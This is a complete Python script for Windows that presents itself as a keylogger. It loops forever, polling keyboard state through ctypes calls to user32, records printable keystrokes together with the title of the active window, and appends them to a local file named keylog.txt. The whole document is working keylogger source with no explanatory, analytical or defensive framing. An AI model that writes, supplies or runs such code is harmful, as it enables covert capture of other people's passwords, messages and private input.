import ctypes
import time

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

def get_current_window():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd) + 1
    window_title = ctypes.create_unicode_buffer(length)
    user32.GetWindowTextW(hwnd, window_title, length)
    return hwnd, window_title.value

def keylogger():
    data = ""
    current_window = None

    while True:
        new_window, window_title = get_current_window()

        if new_window != current_window:
            current_window = new_window
            data += f"\n[Window: {window_title}]\n"

        for i in range(32, 127):
            if user32.GetAsyncKeyState(i) & 1:
                data += chr(i)

        if data:
            with open("keylog.txt", "a") as f:
                f.write(data)
            data = ""

        time.sleep(0.01)

if __name__ == '__main__':
    keylogger()
